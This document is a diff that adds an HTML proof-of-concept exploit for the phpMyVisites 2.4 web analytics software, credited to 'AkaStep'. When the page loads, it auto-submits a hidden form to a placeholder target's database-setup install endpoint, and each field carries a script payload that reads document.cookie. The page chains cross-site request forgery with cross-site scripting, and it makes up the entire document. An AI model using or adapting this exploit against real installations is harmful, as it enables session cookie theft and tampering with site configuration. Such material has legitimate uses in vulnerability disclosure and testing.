@@ -1,0 +1,22 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Warning! This is Proof Of Concept Exploit for phpMyVisites 2.4 (version.php 238 2009-12-16 19:48:15Z matthieu_ $)&lt;/title&gt;
+&lt;/head&gt;
+&lt;h1&gt; Warning! This is a Proof Of Concept Exploit for phpMyVisites 2.4:&lt;br/&gt;&lt;/h1&gt;
+&lt;p&gt;// $Id: version.php 238 2009-12-16 19:48:15Z matthieu_ $
+PHPMV_VERSION 2.4
+&lt;/p&gt;
+&lt;/h1&gt;
+&lt;body onload=&quot;javascript:document.forms[0].submit()&quot;&gt;
+
+&lt;form action=&quot;http://CHANGE_TO_RTARGET/phpmv2/index.php?mod=install_database_setup&quot; method=&quot;post&quot; name=&quot;form_phpmv&quot; id=&quot;form_phpmv&quot;&gt;
+&lt;input value=&quot;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&quot; name=&quot;form_dblogin&quot; type=&quot;hidden&quot; /&gt;
+&lt;input value=&quot;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&quot; name=&quot;form_dbpassword&quot; type=&quot;hidden&quot; /&gt;
+&lt;input value=&quot;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&quot; name=&quot;form_dbhost&quot; type=&quot;hidden&quot; /&gt;
+&lt;input value=&quot;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&quot; name=&quot;form_dbname&quot; type=&quot;hidden&quot; /&gt;
+&lt;input value=&quot;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&quot; name=&quot;form_dbprefix&quot; type=&quot;hidden&quot;/&gt;&lt;/td&gt;
+
+&lt;!--- Author: AkaStep --&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
